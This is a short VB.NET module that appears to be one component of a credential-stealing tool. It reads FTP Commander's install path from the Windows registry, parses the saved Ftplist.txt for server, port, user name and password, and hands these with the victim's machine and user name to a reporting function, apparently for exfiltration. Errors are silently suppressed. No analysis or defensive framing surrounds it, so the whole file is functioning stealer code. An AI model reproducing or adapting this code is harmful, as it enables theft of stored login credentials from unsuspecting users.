Imports Microsoft.VisualBasic

Module FTPCommander
    Sub FtpCommander()
        Dim sPath As String = Replace(RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\FTP Commander\UninstallString"), "uninstall.exe", vbNullString) & "Ftplist.txt"
        Dim sFile As String = ReadLine(sPath, -1)
        Dim sHost As String = Cut(sFile, ";Server=", ";Port=")
        Dim sPort As String = Cut(sFile, ";Port=", ";Password=")
        Dim sUser As String = Cut(sFile, ";User=", ";Anonymous=")
        Dim sPwd As String = Cut(sFile, ";Password=", ";User=")
        Dim sEntry As String = Cut(sFile, "Name=", ";Server=")

        If Not sUser = "" Then
            Try
                SendMiscCommandRecover(Environment.MachineName & "/" & Environment.UserName & "|(" & sEntry & ")" & sHost & ":" & sPort & "|" & sUser & "|" & sPwd & "|" & 0 & "|[FTPCommander]")
            Catch ex As Exception
            End Try
        Else
        End If
    End Sub

    Function Cut(ByVal sInhalt As String, ByVal sText As String, ByVal stext2 As String) As String
        On Error Resume Next
        Dim c() As String
        Dim c2() As String
        c = Split(sInhalt, sText)
        c2 = Split(c(1), stext2)
        Cut = c2(0)
    End Function
End Module
